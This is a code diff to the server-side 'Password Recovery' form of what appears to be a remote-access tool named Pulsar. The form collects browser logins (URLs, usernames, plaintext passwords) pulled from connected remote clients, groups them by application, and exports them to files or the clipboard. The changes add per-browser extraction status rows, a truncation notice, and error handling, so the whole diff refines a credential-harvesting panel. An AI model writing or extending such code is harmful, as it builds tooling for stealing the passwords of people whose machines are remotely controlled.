@@ -59,7 +59,11 @@ namespace Pulsar.Server.Forms
         /// </summary>
         private void RegisterMessageHandler()
         {
-            //_connectClient.ClientState += ClientDisconnected;
+            foreach (var client in _clients)
+            {
+                if (client != null)
+                    client.ClientState += ClientDisconnected;
+            }
             _recoveryHandler.AccountsRecovered += AddPasswords;
             MessageHandler.Register(_recoveryHandler);
         }
@@ -69,9 +73,13 @@ namespace Pulsar.Server.Forms
         /// </summary>
         private void UnregisterMessageHandler()
         {
+            foreach (var client in _clients)
+            {
+                if (client != null)
+                    client.ClientState -= ClientDisconnected;
+            }
             MessageHandler.Unregister(_recoveryHandler);
             _recoveryHandler.AccountsRecovered -= AddPasswords;
-            //_connectClient.ClientState -= ClientDisconnected;
         }
 
         /// <summary>
@@ -83,7 +91,14 @@ namespace Pulsar.Server.Forms
         {
             if (!connected)
             {
-                this.Invoke((MethodInvoker)this.Close);
+                if (IsHandleCreated)
+                {
+                    BeginInvoke((MethodInvoker)(() =>
+                    {
+                        if (_clients.All(c => c == null || !c.Connected))
+                            Close();
+                    }));
+                }
             }
         }
 
@@ -106,54 +121,97 @@ namespace Pulsar.Server.Forms
             _recoveryHandler.BeginAccountRecovery();
         }
 
-        private void AddPasswords(object sender, string clientIdentifier, List<RecoveredAccount> accounts)
+        private void AddPasswords(object sender, string clientIdentifier, List<RecoveredAccount> accounts, List<PasswordRecoverySource> sources, bool truncated)
         {
             try
             {
                 if (accounts == null || accounts.Count == 0) // no accounts found
                 {
-                    var lvi = new ListViewItem { Tag = _noResultsFound, Text = clientIdentifier };
-
-                    lvi.SubItems.Add(_noResultsFound.Url); // URL
-                    lvi.SubItems.Add(_noResultsFound.Username); // User
-                    lvi.SubItems.Add(_noResultsFound.Password); // Pass
-
-                    var lvg = GetGroupFromApplication(_noResultsFound.Application);
-
-                    if (lvg == null) // create new group
+                    if (sources == null || sources.Count == 0)
                     {
-                        lvg = new ListViewGroup
-                        { Name = _noResultsFound.Application, Header = _noResultsFound.Application };
-                        lstPasswords.Groups.Add(lvg); // add the new group
+                        var lvi = new ListViewItem { Tag = _noResultsFound, Text = clientIdentifier };
+                        lvi.SubItems.Add(_noResultsFound.Url);
+                        lvi.SubItems.Add(_noResultsFound.Username);
+                        lvi.SubItems.Add(_noResultsFound.Password);
+                        var lvg = GetGroupFromApplication(_noResultsFound.Application);
+                        if (lvg == null)
+                        {
+                            lvg = new ListViewGroup { Name = _noResultsFound.Application, Header = _noResultsFound.Application };
+                            lstPasswords.Groups.Add(lvg);
+                        }
+                        lvi.Group = lvg;
+                        lstPasswords.Items.Add(lvi);
                     }
-
-                    lvi.Group = lvg;
-                    lstPasswords.Items.Add(lvi);
-                    return;
                 }
 
                 var items = new List<ListViewItem>();
-                foreach (var acc in accounts)
+                if (accounts != null)
                 {
-                    var lvi = new ListViewItem { Tag = acc, Text = clientIdentifier };
-
-                    lvi.SubItems.Add(acc.Url); // URL
-                    lvi.SubItems.Add(acc.Username); // User
-                    lvi.SubItems.Add(acc.Password); // Pass
-
-                    var lvg = GetGroupFromApplication(acc.Application);
-
-                    if (lvg == null) // create new group
+                    foreach (var acc in accounts)
                     {
-                        lvg = new ListViewGroup { Name = acc.Application.Replace(" ", string.Empty), Header = acc.Application };
-                        lstPasswords.Groups.Add(lvg); // add the new group
+                        var lvi = new ListViewItem { Tag = acc, Text = clientIdentifier };
+                        lvi.SubItems.Add(acc.Url);
+                        lvi.SubItems.Add(acc.Username);
+                        lvi.SubItems.Add(acc.Password);
+                        var lvg = GetGroupFromApplication(acc.Application);
+                        if (lvg == null)
+                        {
+                            lvg = new ListViewGroup { Name = acc.Application.Replace(" ", string.Empty), Header = acc.Application };
+                            lstPasswords.Groups.Add(lvg);
+                        }
+                        lvi.Group = lvg;
+                        items.Add(lvi);
                     }
-
-                    lvi.Group = lvg;
-                    items.Add(lvi);
                 }
 
                 lstPasswords.Items.AddRange(items.ToArray());
+
+                if (sources != null)
+                {
+                    foreach (var source in sources)
+                    {
+                        var statusAccount = new RecoveredAccount
+                        {
+                            Application = $"{source.Application ?? "Browser"} [{source.Status}]",
+                            Url = string.IsNullOrEmpty(source.Profile) ? "N/A" : source.Profile,
+                            Username = string.IsNullOrEmpty(source.Detail) ? source.Status.ToString() : source.Detail,
+                            Password = $"{source.AccountCount} account(s)"
+                        };
+                        var lvi = new ListViewItem { Tag = statusAccount, Text = clientIdentifier };
+                        lvi.SubItems.Add(statusAccount.Url);
+                        lvi.SubItems.Add(statusAccount.Username);
+                        lvi.SubItems.Add(statusAccount.Password);
+                        var lvg = GetGroupFromApplication(statusAccount.Application);
+                        if (lvg == null)
+                        {
+                            lvg = new ListViewGroup
+                            {
+                                Name = statusAccount.Application.Replace(" ", string.Empty),
+                                Header = statusAccount.Application
+                            };
+                            lstPasswords.Groups.Add(lvg);
+                        }
+                        lvi.Group = lvg;
+                        lstPasswords.Items.Add(lvi);
+                    }
+                }
+
+                if (truncated)
+                {
+                    var lvi = new ListViewItem { Tag = _noResultsFound, Text = clientIdentifier };
+                    lvi.SubItems.Add("Extraction truncated");
+                    lvi.SubItems.Add("N/A");
+                    lvi.SubItems.Add("Only bounded results are shown");
+                    var lvg = GetGroupFromApplication("Extraction Status");
+                    if (lvg == null)
+                    {
+                        lvg = new ListViewGroup { Name = "ExtractionStatus", Header = "Extraction Status" };
+                        lstPasswords.Groups.Add(lvg);
+                    }
+                    lvi.Group = lvg;
+                    lstPasswords.Items.Add(lvi);
+                }
+
                 UpdateRecoveryCount();
             }
             catch
@@ -168,11 +226,17 @@ namespace Pulsar.Server.Forms
 
         private string ConvertToFormat(string format, RecoveredAccount login)
         {
+            if (login == null)
+                return string.Empty;
+            if (string.IsNullOrEmpty(format))
+                format = "APP - URL - USER:PASS";
+            if (format.Length > 256)
+                format = format.Substring(0, 256);
             return format
-                .Replace("APP", login.Application)
-                .Replace("URL", login.Url)
-                .Replace("USER", login.Username)
-                .Replace("PASS", login.Password);
+                .Replace("APP", login.Application ?? string.Empty)
+                .Replace("URL", login.Url ?? string.Empty)
+                .Replace("USER", login.Username ?? string.Empty)
+                .Replace("PASS", login.Password ?? string.Empty);
         }
 
         private StringBuilder GetLoginData(bool selected = false)
@@ -223,7 +287,15 @@ namespace Pulsar.Server.Forms
             {
                 if (sfdPasswords.ShowDialog() == DialogResult.OK)
                 {
-                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
+                    try
+                    {
+                        File.WriteAllText(sfdPasswords.FileName, sb.ToString(), Encoding.UTF8);
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(this, "Could not save the recovery results: " + ex.Message,
+                            "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
                 }
             }
         }
@@ -235,7 +307,15 @@ namespace Pulsar.Server.Forms
             {
                 if (sfdPasswords.ShowDialog() == DialogResult.OK)
                 {
-                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
+                    try
+                    {
+                        File.WriteAllText(sfdPasswords.FileName, sb.ToString(), Encoding.UTF8);
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(this, "Could not save the selected recovery results: " + ex.Message,
+                            "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
                 }
             }
         }
@@ -244,15 +324,17 @@ namespace Pulsar.Server.Forms
         private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
         {
             StringBuilder sb = GetLoginData();
-
-            ClipboardHelper.SetClipboardTextSafe(sb.ToString());
+            if (!ClipboardHelper.SetClipboardTextSafe(sb.ToString()))
+                MessageBox.Show(this, "The recovery results could not be copied to the clipboard.",
+                    "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Warning);
         }
 
         private void copySelectedToolStripMenuItem_Click(object sender, EventArgs e)
         {
             StringBuilder sb = GetLoginData(true);
-
-            ClipboardHelper.SetClipboardTextSafe(sb.ToString());
+            if (!ClipboardHelper.SetClipboardTextSafe(sb.ToString()))
+                MessageBox.Show(this, "The selected recovery results could not be copied to the clipboard.",
+                    "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Warning);
         }
         #endregion
 
